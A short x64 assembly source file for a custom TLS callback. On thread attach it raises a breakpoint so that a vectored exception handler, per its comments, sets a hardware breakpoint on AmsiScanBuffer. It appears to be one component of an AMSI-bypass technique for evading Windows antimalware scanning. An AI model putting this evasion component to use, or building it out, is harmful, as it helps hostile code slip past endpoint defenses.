[BITS 64]

; nasm -f bin TLSCallback.asm -o TLSCallback.bin ; xxd -i TLSCallback.bin

CustomCallback :
    ; (PVOID DllHandle, DWORD dwReason, PVOID Reserved)

    ; RDX has "Reason". 2 == DLL_THREAD_ATTACH
    cmp edx, 2
    jne .ignore

    ; trigger our VEH EXCEPTION_BREAKPOINT (0x80000003)
    ; Then our VEH register the HWBP on AmsiScanBuffer
    int3
.ignore:
    ret
    

    
